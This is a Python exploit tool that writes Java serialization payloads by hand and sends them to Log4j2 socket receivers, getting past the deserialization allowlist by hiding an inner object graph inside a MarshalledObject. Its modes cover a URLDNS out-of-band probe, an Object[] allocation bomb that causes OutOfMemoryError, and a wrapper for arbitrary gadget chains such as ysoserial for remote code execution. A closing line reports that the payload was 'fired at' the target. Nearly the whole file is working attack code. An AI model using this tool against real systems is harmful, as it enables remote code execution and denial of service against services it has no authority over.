#!/usr/bin/env python3
"""
payload.py — build/send Log4j2 #4255 payloads (FOIS MarshalledObject bypass).

The receiver reads through FilteredObjectInputStream, whose allowlist keeps
java.rmi.MarshalledObject. A MarshalledObject stores its payload as an opaque
byte[], so the resolveClass filter never sees it; Log4jLogEvent$LogEventProxy
.readResolve() then calls marshalledMessage.get(), which deserializes those bytes
on a FRESH, UNFILTERED ObjectInputStream. Everything here builds that same
envelope (LogEventProxy -> MarshalledObject{objBytes = inner}) around a chosen
inner graph.

This is a pure-Python Java-serialization writer: no JVM and no jars are needed to
build a payload.

Modes
  dns  --oob HOST        inner = JDK-only URLDNS chain (HashMap -> java.net.URL).
                         Safe, detection-only: a DNS lookup proves the inner
                         stream is unfiltered. No gadget library needed.
  oom                    inner = Object[] of length 2^31-1 (~44 bytes on the
                         wire). MarshalledObject.get() tries to allocate it ->
                         "OutOfMemoryError: Requested array size exceeds VM limit".
  wrap --gadget FILE     inner = a raw serialized stream you provide (e.g.
                         `ysoserial CommonsCollections6 '<cmd>'`, or the nested-
                         HashSet CPU bomb from PayloadGen.java). Use '-' for stdin.

Each mode either sends to -t/-p or writes to -o.
For authorized local testing only.
"""
import argparse, socket, struct, sys

TC_NULL, TC_CLASSDESC, TC_OBJECT, TC_STRING, TC_ARRAY = 0x70, 0x72, 0x73, 0x74, 0x75
TC_ENDBLOCKDATA, TC_BLOCKDATA = 0x78, 0x77
SC_WRITE_METHOD, SC_SERIALIZABLE = 0x01, 0x02
MAGIC = b"\xac\xed\x00\x05"
_TS = {}  # field name -> type string, for L/[ fields


def _utf(s):
    b = s.encode("utf-8"); return struct.pack(">H", len(b)) + b


def _string(s):
    return bytes([TC_STRING]) + _utf(s)


def _classdesc(name, suid, flags, fields):
    out = bytes([TC_CLASSDESC]) + _utf(name) + struct.pack(">q", suid) + bytes([flags])
    out += struct.pack(">H", len(fields))
    for tc, fname in fields:
        out += tc.encode()[:1] + _utf(fname)
        if tc in ("L", "["):
            out += _string(_TS[fname])
    return out + bytes([TC_ENDBLOCKDATA, TC_NULL])  # no superclass


def _obj(name, suid, flags, fields, values, type_strings=None):
    if type_strings:
        _TS.update(type_strings)
    out = bytes([TC_OBJECT]) + _classdesc(name, suid, flags, fields) + values
    if flags & SC_WRITE_METHOD:
        out += bytes([TC_ENDBLOCKDATA])
    return out


def _byte_array(data):
    return (bytes([TC_ARRAY]) + _classdesc("[B", -5984413125824719648, SC_SERIALIZABLE, [])
            + struct.pack(">i", len(data)) + data)


def build_urldns(host):
    """HashMap{ java.net.URL(host): "x" } — URL.hashCode() triggers a DNS lookup.
    authority must mirror host, else URL.readResolve never reaches hashCode()."""
    S = "Ljava/lang/String;"
    url = _obj("java.net.URL", -7627629688361524110, SC_SERIALIZABLE | SC_WRITE_METHOD,
               [("I", "hashCode"), ("I", "port"), ("L", "authority"), ("L", "file"),
                ("L", "host"), ("L", "protocol"), ("L", "ref")],
               struct.pack(">i", -1) + struct.pack(">i", -1) + _string(host) + _string("/")
               + _string(host) + _string("http") + bytes([TC_NULL]),
               type_strings={"authority": S, "file": S, "host": S, "protocol": S, "ref": S})
    hashmap = _obj("java.util.HashMap", 362498820763181265, SC_SERIALIZABLE | SC_WRITE_METHOD,
                   [("F", "loadFactor"), ("I", "threshold")],
                   struct.pack(">f", 0.75) + struct.pack(">i", 12) + bytes([TC_BLOCKDATA, 8])
                   + struct.pack(">i", 16) + struct.pack(">i", 1) + url + _string("x"))
    return MAGIC + hashmap


def build_oom(n=0x7FFFFFFF):
    """Object[] with a declared length of 2^31-1 and no elements. readArray
    allocates the array (16 GB of refs) BEFORE reading any element -> OOM."""
    arr = (bytes([TC_ARRAY]) + _classdesc("[Ljava.lang.Object;", -8012369246846506644,
                                           SC_SERIALIZABLE, []) + struct.pack(">i", n))
    return MAGIC + arr


def wrap(inner_bytes):
    """LogEventProxy -> MarshalledObject{objBytes = inner}."""
    if inner_bytes[:2] != b"\xac\xed":
        raise ValueError("inner gadget is not a Java serialization stream (missing AC ED magic)")
    marshalled = _obj("java.rmi.MarshalledObject", 8988374069173025854, SC_SERIALIZABLE,
                      [("I", "hash"), ("[", "locBytes"), ("[", "objBytes")],
                      struct.pack(">i", 0) + bytes([TC_NULL]) + _byte_array(inner_bytes),
                      type_strings={"locBytes": "[B", "objBytes": "[B"})
    proxy = _obj("org.apache.logging.log4j.core.impl.Log4jLogEvent$LogEventProxy",
                 -8634075037355293699, SC_SERIALIZABLE | SC_WRITE_METHOD,
                 [("L", "marshalledMessage")], marshalled,
                 type_strings={"marshalledMessage": "Ljava/rmi/MarshalledObject;"})
    return MAGIC + proxy


def send(host, port, payload, timeout=10):
    s = socket.create_connection((host, port), timeout)
    try:
        s.sendall(payload)
        s.shutdown(socket.SHUT_WR)  # clean EOF; allocation/exec already happened
        try:
            s.recv(64)
        except (socket.timeout, OSError):
            pass
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description="Log4j2 #4255 payload builder (FOIS MarshalledObject bypass)")
    sub = ap.add_subparsers(dest="mode", required=True)
    d = sub.add_parser("dns", help="URLDNS detection chain (safe, no code exec)")
    d.add_argument("--oob", required=True, help="hostname to resolve, e.g. me.oast.pro")
    sub.add_parser("oom", help="Object[] 2^31-1 array bomb (OOM DoS)")
    w = sub.add_parser("wrap", help="wrap a raw serialized gadget (RCE / CPU bomb); '-' = stdin")
    w.add_argument("--gadget", required=True)
    for p in [d, sub.choices["oom"], w]:
        p.add_argument("-t", "--target", help="receiver host")
        p.add_argument("-p", "--port", type=int, default=4560)
        p.add_argument("-o", "--out", help="write payload to file instead of sending")
    a = ap.parse_args()

    if a.mode == "dns":
        payload, note = wrap(build_urldns(a.oob)), f"URLDNS -> {a.oob}"
    elif a.mode == "oom":
        payload, note = wrap(build_oom()), "Object[] 2^31-1 OOM bomb"
    else:
        raw = sys.stdin.buffer.read() if a.gadget == "-" else open(a.gadget, "rb").read()
        payload, note = wrap(raw), f"gadget from {a.gadget} ({len(raw)} bytes)"

    sys.stderr.write(f"[*] built LogEventProxy payload: {len(payload)} bytes ({note})\n")
    if a.out:
        open(a.out, "wb").write(payload); sys.stderr.write(f"[+] wrote {a.out}\n"); return
    if not a.target:
        ap.error("either -t/--target or -o/--out is required")
    send(a.target, a.port, payload)
    sys.stderr.write(f"[+] fired at {a.target}:{a.port}\n")


if __name__ == "__main__":
    main()
